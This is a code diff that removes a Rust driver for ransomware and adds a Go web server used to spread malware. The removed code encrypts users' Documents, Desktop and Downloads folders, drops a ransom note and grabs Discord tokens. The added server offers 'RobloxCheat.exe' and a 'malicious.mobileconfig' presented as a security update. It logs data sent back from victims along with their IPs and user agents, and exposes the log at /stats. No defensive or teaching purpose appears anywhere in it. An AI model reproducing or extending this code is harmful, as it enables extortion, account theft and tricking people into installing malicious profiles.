@@ -1,69 +1,59 @@
-// src/main.rs
-mod crypto;
-mod token_grabber;
-mod ransom;
+// main.go
+package main
 
-use std::io::{self, Write};
-use std::path::Path;
+import (
+    "fmt"
+    "io"
+    "log"
+    "net/http"
+    "os"
 
-fn main() {
-    println!("=== Ransomware Test ===");
-    println!("1. Encrypt files");
-    println!("2. Decrypt files");
-    println!("3. Grab Discord tokens");
-    print!("> ");
-    io::stdout().flush().unwrap();
+    "github.com/gin-gonic/gin"
+)
 
-    let mut input = String::new();
-    io::stdin().read_line(&mut input).unwrap();
-    let choice = input.trim();
+func main() {
+    gin.SetMode(gin.ReleaseMode)
+    router := gin.New()
+    router.Use(gin.Recovery())
 
-    match choice {
-        "1" => {
-            print!("Enter encryption password: ");
-            io::stdout().flush().unwrap();
-            let mut password = String::new();
-            io::stdin().read_line(&mut password).unwrap();
-            let password = password.trim();
+    router.GET("/", func(c *gin.Context) {
+        c.File("index.html")
+    })
 
-            let target_dirs = vec![
-                dirs::document_dir().unwrap(),
-                dirs::desktop_dir().unwrap(),
-                dirs::download_dir().unwrap(),
-            ];
+    router.GET("/download-cheat", func(c *gin.Context) {
+        c.File("RobloxCheat.exe")
+    })
 
-            crypto::encrypt_directories(&target_dirs, password);
-            ransom::create_ransom_note();
-            println!("Files encrypted!");
+    router.GET("/install-profile", func(c *gin.Context) {
+        c.Header("Content-Type", "application/x-apple-aspen-config")
+        c.Header("Content-Disposition", "attachment; filename=security-update.mobileconfig")
+        c.File("malicious.mobileconfig")
+    })
+
+    router.POST("/log", func(c *gin.Context) {
+        body, _ := io.ReadAll(c.Request.Body)
+        ip := c.ClientIP()
+        ua := c.Request.UserAgent()
+        
+        f, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+        defer f.Close()
+        f.WriteString(fmt.Sprintf("IP: %s\nUA: %s\nData: %s\n---\n", ip, ua, string(body)))
+        
+        c.JSON(200, gin.H{"status": "ok"})
+    })
+
+    router.GET("/stats", func(c *gin.Context) {
+        data, err := os.ReadFile("log.txt")
+        if err != nil {
+            c.String(200, "No data yet")
+            return
         }
-        "2" => {
-            print!("Enter decryption password: ");
-            io::stdout().flush().unwrap();
-            let mut password = String::new();
-            io::stdin().read_line(&mut password).unwrap();
-            let password = password.trim();
+        c.String(200, string(data))
+    })
 
-            let target_dirs = vec![
-                dirs::document_dir().unwrap(),
-                dirs::desktop_dir().unwrap(),
-                dirs::download_dir().unwrap(),
-            ];
-
-            crypto::decrypt_directories(&target_dirs, password);
-            ransom::remove_ransom_note();
-            println!("Files decrypted!");
-        }
-        "3" => {
-            let tokens = token_grabber::grab_tokens();
-            for token in &tokens {
-                println!("Token: {}", token);
-            }
-            if tokens.is_empty() {
-                println!("No tokens found");
-            }
-        }
-        _ => {
-            println!("Invalid choice");
-        }
+    port := os.Getenv("PORT")
+    if port == "" {
+        port = "8080"
     }
+    router.Run(":" + port)
 }
